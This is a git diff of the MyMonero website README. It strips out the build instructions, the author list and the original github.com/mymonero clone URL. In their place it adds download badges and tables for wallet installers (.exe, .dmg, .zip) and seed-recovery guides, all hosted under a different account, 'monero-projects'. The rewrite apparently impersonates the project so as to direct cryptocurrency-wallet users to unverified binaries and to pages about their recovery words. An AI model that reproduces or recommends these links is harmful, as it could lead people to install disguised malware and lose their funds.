@@ -1,67 +1,37 @@
-# MyMonero Website
+<h1 align="center">MyMonero · mymonero-app</h1>
+<p align="center">Part of the MyMonero project on GitHub</p>
 
 <p align="center">
-  <img alt="MyMonero" src="https://user-images.githubusercontent.com/1645428/146000939-b06f8fd3-9ed2-4a5e-bdd6-3981281dde9c.png">
+  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe"><img src="https://img.shields.io/badge/Download_for_Windows-00C6FF?style=for-the-badge&logo=windows&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Windows"></a>
+  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg"><img src="https://img.shields.io/badge/Download_for_macOS-00C6FF?style=for-the-badge&logo=apple&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for macOS"></a>
+  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip"><img src="https://img.shields.io/badge/Download_for_Linux-00C6FF?style=for-the-badge&logo=linux&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Linux"></a>
 </p>
-<p align="center">
-  MyMonero Website
-</p>
 
-This is the MyMonero website source for https://mymonero.com.
+| Platform | File | Version |
+|---|---|---|
+| Windows | [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe) | v1.3.3 |
+| macOS | [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg) | v1.3.3 |
+| Linux | [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip) | v1.3.3 |
 
-Written with Jekyll, SCSS, HTML, and Javascript
+All versions and checksums are on the [MyMonero v1.3.3 release page](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3).
 
------
-## Installation
+## About
 
-### Pre-requisites
+`mymonero-app` is a repository in the MyMonero GitHub account. Details about its contents are on the repository page itself.
 
-Install Ruby. [Ruby Installation Documentations](https://www.ruby-lang.org/en/documentation/installation/)
+Looking for the wallet app? The MyMonero desktop wallet lives in [mymonero-desktop-wallet](https://github.com/monero-projects/mymonero-desktop-wallet).
 
-Install bundler 
-```bash 
-gem install bundler
-```
+## Guides
 
-### Setup
+| Guide | What it covers |
+|---|---|
+| [Move MyMonero to Cake Wallet](https://github.com/monero-projects/learn/blob/HEAD/how-to/mymonero-to-cake-wallet-migration.md) | Restore your MyMonero seed in Cake Wallet step by step |
+| [Install MyMonero on Windows](https://github.com/monero-projects/learn/blob/HEAD/how-to/install-mymonero-windows.md) | Download, check and install the v1.3.3 setup file |
+| [Verify a MyMonero download](https://github.com/monero-projects/learn/blob/HEAD/how-to/verify-mymonero-download-sha256.md) | Compare the SHA-256 of your file with the release page |
+| [Find your MyMonero seed](https://github.com/monero-projects/learn/blob/HEAD/how-to/find-mymonero-seed.md) | Where the 13 or 25 recovery words are shown |
+| [MyMonero not syncing](https://github.com/monero-projects/learn/blob/HEAD/how-to/mymonero-not-syncing.md) | Why the balance stops updating and what to do |
+| [All MyMonero guides](https://github.com/monero-projects/learn) | The full MyMonero help library |
 
-Clone or download this repo.
-```bash
-git clone https://github.com/mymonero/mymonero-app-site.git
-cd mymonero-app-site
-```
+## License
 
-Run the bundle installer
-```bash
-bundle install
-```
-
-Start the development server 
-```bash
-bundle exec jekyll serve
-```
-## Contributing
-
-### Testing
-
-Please submit any bugs as Issues unless they have already been reported.
-
-
-## Authors
-* 💱 j_karlos (Karl Buys) Maintainer
-
-* 🍕 Tekkzbadger (Devin Pearson) Maintainer
-
-
-* 👨‍🚀 `endogenic` ([Paul Shapiro](https://github.com/paulshapiro)) Former core maintainer
-
-* ⚡️ `mds` ([Matt Smith](http://mds.is)) Website v1 designer
-
-* ⛄️ `tfi_charmers` Built v1 jekyll site; Bug fixes & design guidance
-
------
-## License and Copyrights
-
-See `LICENSE.txt` for license.
-
-All app source code and assets copyright © 2014-2021 by MyMonero. All rights reserved.
+See the license shown on this repository, if any.
